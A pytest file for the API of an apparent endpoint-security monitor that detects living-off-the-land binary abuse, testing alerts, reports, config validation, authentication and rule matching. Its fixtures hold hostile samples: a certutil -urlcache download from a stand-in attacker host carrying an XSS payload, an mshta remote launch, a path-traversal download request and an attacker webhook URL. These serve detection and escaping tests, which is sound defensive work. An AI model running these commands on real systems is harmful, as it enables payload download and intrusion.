"""
API tests run against an isolated config file, database and reports directory
"""
import json
import time

import pytest

from backend.api.enhanced_api import EnhancedSecurityAPIServer
from backend.core.config import ConfigManager
from backend.core.database import DatabaseManager
from backend.reporting.enhanced_report_generator import EnhancedSecurityReportGenerator


@pytest.fixture
def server(tmp_path):
    config = ConfigManager(str(tmp_path / "config.json"))
    db = DatabaseManager(str(tmp_path / "test.db"))
    reports = EnhancedSecurityReportGenerator(db, output_dir=str(tmp_path / "reports"))
    scans = []
    srv = EnhancedSecurityAPIServer(config, db, report_generator=reports, scan_callback=lambda: scans.append(time.time()))
    srv.scans = scans
    return srv


@pytest.fixture
def client(server):
    return server.app.test_client()


def insert_alert(db, **overrides):
    alert = {
        'type': 'lolbin_detection',
        'severity': 'CRITICAL',
        'binary': 'certutil.exe',
        'command': 'certutil.exe -urlcache -f http://evil.example/<script>alert(1)</script>',
        'details': 'Suspicious certutil.exe execution',
        'system_name': 'test-host',
        'mitre_id': 'T1105',
        'mitre_link': 'https://attack.mitre.org/techniques/T1105/',
        **overrides,
    }
    assert db.insert_alert(alert)
    return alert


def test_status(client):
    response = client.get('/api/v1/status')
    assert response.status_code == 200
    body = response.get_json()
    assert body['status'] == 'healthy'
    assert body['capabilities']['scan'] is True


def test_system_health(client):
    response = client.get('/api/v1/system/health')
    assert response.status_code == 200
    assert response.get_json()['resources']['memory']['total'] > 0


def test_alert_lifecycle(client):
    created = client.post('/api/v1/alerts/test', json={'severity': 'high'})
    assert created.status_code == 201
    alert = created.get_json()['alert']
    assert alert['type'] == 'test_alert'
    assert alert['severity'] == 'HIGH'
    assert alert['status'] == 'new'

    listing = client.get('/api/v1/alerts').get_json()
    assert listing['pagination']['total'] == 1
    assert listing['alerts'][0]['id'] == alert['id']

    detail = client.get(f"/api/v1/alerts/{alert['id']}")
    assert detail.status_code == 200
    assert detail.get_json()['alert']['metadata']['test'] is True

    acknowledged = client.put(f"/api/v1/alerts/{alert['id']}/status", json={'status': 'acknowledged'})
    assert acknowledged.status_code == 200
    assert acknowledged.get_json()['alert']['acknowledged_at'] is not None

    resolved = client.put(f"/api/v1/alerts/{alert['id']}/status", json={'status': 'false_positive'})
    body = resolved.get_json()['alert']
    assert body['status'] == 'false_positive'
    assert body['false_positive'] is True


def test_alert_errors_are_json(client):
    missing = client.get('/api/v1/alerts/does-not-exist')
    assert missing.status_code == 404
    assert missing.get_json()['error'] == 'Alert not found'

    bad_status = client.put('/api/v1/alerts/does-not-exist/status', json={'status': 'bogus'})
    assert bad_status.status_code == 400

    bad_json = client.put('/api/v1/alerts/x/status', data='{not json', content_type='application/json')
    assert bad_json.status_code == 400

    unknown_route = client.get('/api/v1/nope')
    assert unknown_route.status_code == 404
    assert 'error' in unknown_route.get_json()


def test_alert_filters_and_pagination(client, server):
    insert_alert(server.db_manager, severity='CRITICAL')
    insert_alert(server.db_manager, severity='HIGH', type='high_cpu', binary=None)
    insert_alert(server.db_manager, severity='LOW', type='high_memory', binary=None)

    critical = client.get('/api/v1/alerts?severity=critical').get_json()
    assert critical['pagination']['total'] == 1

    by_type = client.get('/api/v1/alerts?type=high_cpu').get_json()
    assert [a['severity'] for a in by_type['alerts']] == ['HIGH']

    page = client.get('/api/v1/alerts?limit=2').get_json()
    assert page['pagination']['count'] == 2
    assert page['pagination']['has_more'] is True

    assert client.get('/api/v1/alerts?severity=extreme').status_code == 400
    assert client.get('/api/v1/alerts?limit=abc').status_code == 400


def test_dashboard_summary(client, server):
    insert_alert(server.db_manager, severity='CRITICAL')
    second = insert_alert(server.db_manager, severity='HIGH', type='high_cpu', binary=None)
    server.db_manager.update_alert_status(second['id'], 'resolved', resolved_at=time.time())

    summary = client.get('/api/v1/dashboard/summary').get_json()
    assert summary['alerts']['total'] == 2
    assert summary['alerts']['active'] == 1
    assert summary['alerts']['by_status']['resolved'] == 1
    # Only the open CRITICAL alert counts toward risk
    assert summary['risk_score'] == 20
    assert len(summary['timeline']) == 7
    assert summary['timeline'][-1]['total'] == 2
    assert {d['name'] for d in summary['distribution']} == {'certutil.exe', 'high cpu'}


@pytest.mark.parametrize('report_format', ['html', 'csv', 'json'])
def test_generate_and_download_reports(client, server, report_format):
    insert_alert(server.db_manager)

    generated = client.post('/api/v1/reports/generate', json={'format': report_format, 'days': 7})
    assert generated.status_code == 201
    download_url = generated.get_json()['download_url']

    downloaded = client.get(download_url)
    assert downloaded.status_code == 200
    assert 'attachment' in downloaded.headers['Content-Disposition']
    content = downloaded.get_data(as_text=True)

    if report_format == 'html':
        assert '<script>alert(1)</script>' not in content
        assert 'data:image/png;base64,' in content
    elif report_format == 'csv':
        assert content.splitlines()[0].startswith('timestamp,id,type,severity')
        assert 'certutil.exe' in content
    else:
        assert json.loads(content)['summary']['total_alerts'] == 1

    reports = client.get('/api/v1/reports').get_json()['reports']
    assert len(reports) == 1


def test_report_options_drop_columns(client, server):
    insert_alert(server.db_manager)
    generated = client.post('/api/v1/reports/generate', json={
        'format': 'csv', 'days': 0, 'include_commands': False, 'include_mitre': False
    }).get_json()
    header = client.get(generated['download_url']).get_data(as_text=True).splitlines()[0]
    assert 'command' not in header
    assert 'mitre_id' not in header
    assert 'details' in header


def test_reports_without_alerts(client):
    for report_format in ('html', 'csv', 'json'):
        response = client.post('/api/v1/reports/generate', json={'format': report_format})
        assert response.status_code == 201, report_format


def test_report_validation_and_traversal(client):
    assert client.post('/api/v1/reports/generate', json={'format': 'pdf'}).status_code == 400
    assert client.post('/api/v1/reports/generate', json={'days': -1}).status_code == 400
    assert client.get('/api/v1/reports/download/..%5Cconfig.json').status_code == 404
    assert client.get('/api/v1/reports/download/missing.csv').status_code == 404


def test_legacy_csv_download(client, server):
    insert_alert(server.db_manager)
    response = client.get('/download-csv?days=30')
    assert response.status_code == 200
    assert response.mimetype == 'text/csv'


def test_config_read_and_update(client, server, tmp_path):
    body = client.get('/api/v1/config').get_json()
    assert body['config']['api']['api_key'] is None
    assert 'cpu_threshold' in body['editable']['monitoring']

    updated = client.put('/api/v1/config', json={
        'monitoring': {'cpu_threshold': 91, 'monitor_interval': '30'},
        'alerting': {'enable_desktop_notifications': False},
        'data_retention_days': 14
    })
    assert updated.status_code == 200

    config = server.config_manager.get_config()
    assert config.monitoring.cpu_threshold == 91.0
    assert config.monitoring.monitor_interval == 30
    assert config.alerting.enable_desktop_notifications is False
    saved = json.loads((tmp_path / 'config.json').read_text())
    assert saved['data_retention_days'] == 14


def test_config_rejects_invalid_and_read_only_values(client, server):
    before = server.config_manager.get_config().monitoring.cpu_threshold

    assert client.put('/api/v1/config', json={'monitoring': {'cpu_threshold': 150}}).status_code == 400
    assert client.put('/api/v1/config', json={'monitoring': {'cpu_threshold': 70, 'bogus': 1}}).status_code == 400
    assert client.put('/api/v1/config', json={'api': {'host': '0.0.0.0'}}).status_code == 400
    assert client.put('/api/v1/config', json={'alerting': {'webhook_url': 'http://attacker'}}).status_code == 400

    # A rejected batch applies nothing
    assert server.config_manager.get_config().monitoring.cpu_threshold == before


def test_scan_and_clear(client, server):
    assert client.post('/api/v1/scan').status_code == 202
    assert len(server.scans) == 1

    insert_alert(server.db_manager)
    cleared = client.delete('/api/v1/alerts').get_json()
    assert cleared['deleted'] == 1
    assert client.get('/api/v1/alerts').get_json()['pagination']['total'] == 0


def test_scan_unavailable_without_service(tmp_path):
    db = DatabaseManager(str(tmp_path / "db.sqlite"))
    srv = EnhancedSecurityAPIServer(
        ConfigManager(str(tmp_path / "config.json")), db,
        report_generator=EnhancedSecurityReportGenerator(db, output_dir=str(tmp_path / "reports"))
    )
    assert srv.app.test_client().post('/api/v1/scan').status_code == 503


def test_api_key_authentication(server, client):
    api_config = server.config_manager.get_config().api
    api_config.enable_authentication = True
    api_config.api_key = 'secret-key'

    assert client.get('/api/v1/alerts').status_code == 401
    assert client.get('/api/v1/alerts', headers={'X-API-Key': 'wrong'}).status_code == 401
    assert client.get('/api/v1/alerts', headers={'X-API-Key': 'secret-key'}).status_code == 200
    # Health endpoints stay open for liveness checks
    assert client.get('/api/v1/status').status_code == 200


def test_alert_search_and_multi_status(client, server):
    insert_alert(server.db_manager, binary='mshta.exe', command='mshta.exe http://x/100%_done',
                 details='remote hta launch')
    cpu = insert_alert(server.db_manager, severity='HIGH', type='high_cpu', binary=None, command=None,
                       details='CPU usage above threshold')
    server.db_manager.update_alert_status(cpu['id'], 'acknowledged', acknowledged_at=time.time())
    insert_alert(server.db_manager)

    def total(query):
        response = client.get(f'/api/v1/alerts?{query}')
        assert response.status_code == 200, response.get_json()
        return response.get_json()['pagination']['total']

    assert total('q=MSHTA') == 1
    # % and _ are matched literally, not as SQL wildcards
    assert total('q=100%25_') == 1
    assert total('q=%25') == 1
    assert total('q=cpu usage') == 1
    assert total('status=new,acknowledged') == 3
    assert total('status=acknowledged') == 1
    assert total('status=new&q=certutil') == 1
    assert client.get('/api/v1/alerts?status=new,bogus').status_code == 400
    assert client.get('/api/v1/alerts?q=' + 'x' * 201).status_code == 400


def test_bulk_status_update(client, server):
    ids = [insert_alert(server.db_manager)['id'] for _ in range(3)]

    response = client.put('/api/v1/alerts/status', json={'ids': ids[:2] + ['missing'], 'status': 'resolved'})
    assert response.status_code == 200
    assert response.get_json()['updated'] == 2

    statuses = {a['id']: a['status'] for a in client.get('/api/v1/alerts').get_json()['alerts']}
    assert statuses[ids[0]] == 'resolved'
    assert statuses[ids[2]] == 'new'
    assert client.get(f'/api/v1/alerts/{ids[0]}').get_json()['alert']['resolved_at'] is not None

    assert client.put('/api/v1/alerts/status', json={'ids': [], 'status': 'resolved'}).status_code == 400
    assert client.put('/api/v1/alerts/status', json={'ids': ids, 'status': 'done'}).status_code == 400
    assert client.put('/api/v1/alerts/status', json={'ids': 'abc', 'status': 'resolved'}).status_code == 400


def test_rules_list_and_tester(client):
    rules = client.get('/api/v1/rules').get_json()
    assert rules['count'] == 10
    assert {'binary', 'mitre_attack_id', 'command_patterns', 'severity'} <= set(rules['rules'][0])

    hit = client.post('/api/v1/rules/test', json={
        'command': '"C:\\Windows\\System32\\certutil.exe" -urlcache -f http://127.0.0.1/x.txt'
    }).get_json()
    assert hit['binary'] == 'certutil.exe'
    assert hit['known_binary'] and hit['matched']
    assert hit['severity'] == 'CRITICAL'
    assert '-urlcache' in hit['patterns_matched']

    benign = client.post('/api/v1/rules/test', json={
        'binary': 'certutil.exe', 'command': 'certutil.exe -verify cert.cer'
    }).get_json()
    assert benign['known_binary'] and not benign['matched']

    unknown = client.post('/api/v1/rules/test', json={'command': 'notepad.exe -urlcache'}).get_json()
    assert not unknown['known_binary'] and not unknown['matched']

    assert client.post('/api/v1/rules/test', json={}).status_code == 400
